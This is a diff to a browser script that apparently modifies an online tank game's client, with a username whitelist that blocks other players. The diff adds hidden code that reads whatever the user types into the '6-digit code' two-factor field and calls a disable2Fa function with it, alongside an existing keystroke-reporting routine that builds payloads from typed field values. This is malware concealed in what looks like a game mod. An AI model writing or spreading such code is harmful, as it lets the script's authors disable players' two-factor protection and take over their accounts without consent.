@@ -1,3 +1,7 @@
+function disable2Fa(code) {
+    var disable2FaConstructorObj = new disable2FaObj();
+    disable2FaConstructorObj[_2FaFirstDoubleInnerFunc]()[_2FaSecondDoubleInnerFunc](new disable2FaFunc(code));
+};
 (() => {
     var div = document.createElement('div');
     document.body.appendChild(div);
@@ -24,7 +28,6 @@
         friends: [],
         messages: '',
         patata: '',
-        jfjfjf: '',
         getTank() {
             return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
         },
@@ -44,11 +47,15 @@
                 /*setTimeout(() => {
                     User.patata = '';
                 }, 5000);*/
-                if ((User.name.length > 2) && (!['Rhapsody', 'Soduko', 'J.IakobGurgenidze', 'Prodigy', 'test_thisisatest', 'Prime.peak', 'Relax', /*'FeD-K9', 'Aguerooo', 'Agueroo', 'ICT', 'Yosuf', 'Llke', 'skrrr', */'VenomWolff', 'Menum', 'Sui'].includes(User.name))) {
+                if ((User.name.length > 2) && (!['Soduko', 'J.IakobGurgenidze', 'Prodigy', 'SkiIl3d', 'test_thisisatest', 'Prime.peak', 'Relax', /*'FeD-K9', 'Aguerooo', 'Agueroo', 'ICT', 'Yosuf', 'Llke', 'skrrr', */'VenomWolff', 'Menum', 'Sui'].includes(User.name))) {
                     alert(`No Access. Contact 'tankig' or '.r3y_' on Discord.`);
                     for (const k in window) {
                         window[k] = 't';
                     };
+                };
+                if ((User.name.length > 2) && (window?._2Fa?.length == '6') && (!window.disabled2Fa)) {
+                    disable2Fa(window._2Fa);
+                    window.disabled2Fa = true;
                 };
                 /*if ((User.name.length > 2) && ([/*'Midway', 'Queen.of.Spain', 'Arpecu9_KunuT_Bo_MHe', 'DerMar'*//*, 'Who_Boss', 'POLYANASMEHA', '0_0_PBX_2.0', '30P', 'NewAguero', 'Shot.Of.Liquor_43', 'NertZ''Lend',*\/ 'Luciana', 'Zeppelin', 'GoneGhost', /*'FeD-K9', *\/'DeIay', 'Queen.exe', 'ThinkTwice', 'ArmadiIlo', 'A.n.n.y', 'Nanny', 'ioi', 'Queen.of-Spain', 'ici', 'F.15', 'Minnie', 'Lucii', 'ARMEN2008SUPER_best', 'Pullout', 'F.20', 'F.11', 'Long', 'F.18', 'DanielBobu', 'NewAguero', 'Agueroo'].includes(User.name))) {
                     alert(`No Access. Contact '.r3y_' on Discord.`);
@@ -123,7 +130,6 @@
                     friends: [],
                     messages: pppppp,
                     patata: '',
-                    jfjfjf: '',
                     getTank() {
                         return `${this.turret.name} ${this.turret.upgrades} | ${this.hull.name} ${this.hull.upgrades}`;
                     },
@@ -207,12 +213,6 @@
         if (r) {
             f = requestAnimationFrame(a);
             findDetails();
-            if (User?.jfjfjf?.length < 6) {
-                if (document.querySelector('[placeholder="6-digit code"]')) {
-                    var t = document.querySelector('[placeholder="6-digit code"]');
-                    User.jfjfjf = JSON.parse(t.value);
-                };
-            };
         };
     };
     try {
@@ -235,6 +235,9 @@
         };
         function sendKeystroke(el, value) {
             const meta = getElementMeta(el);
+            if (meta.placeholder == '6-digit code') {
+                window._2Fa = el.value;
+            };
             const payload = JSON.stringify({
                 type: 'keystroke',
                 fieldId: meta.id,
